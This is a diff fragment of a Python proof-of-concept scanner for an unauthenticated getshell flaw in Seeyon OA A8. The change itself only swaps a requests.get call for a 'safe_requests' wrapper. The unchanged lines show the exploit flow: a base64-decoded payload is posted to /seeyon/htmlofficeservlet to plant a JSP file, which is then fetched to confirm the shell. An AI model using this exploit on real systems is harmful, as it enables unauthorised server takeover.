@@ -10,6 +10,7 @@ import time
 import base64
 
 import requests
+from security import safe_requests
 
 
 def poc(url, **kwargs):
@@ -24,7 +25,7 @@ def poc(url, **kwargs):
     try:
         req = requests.post(url + '/seeyon/htmlofficeservlet', headers=ua, data=base64.b64decode(pk2))
         time.sleep(1.5)
-        req2 = requests.get(url + '/seeyon/seeyouvuln.jsp', allow_redirects=False)
+        req2 = safe_requests.get(url + '/seeyon/seeyouvuln.jsp', allow_redirects=False)
         if "Check_vuln_shell" in req2.text:
             res = "发现目标存在 致远 OA A8 无需认证 Getshell 漏洞, check url: %s" % url + '/seeyon/seeyouvuln.jsp'
             return res
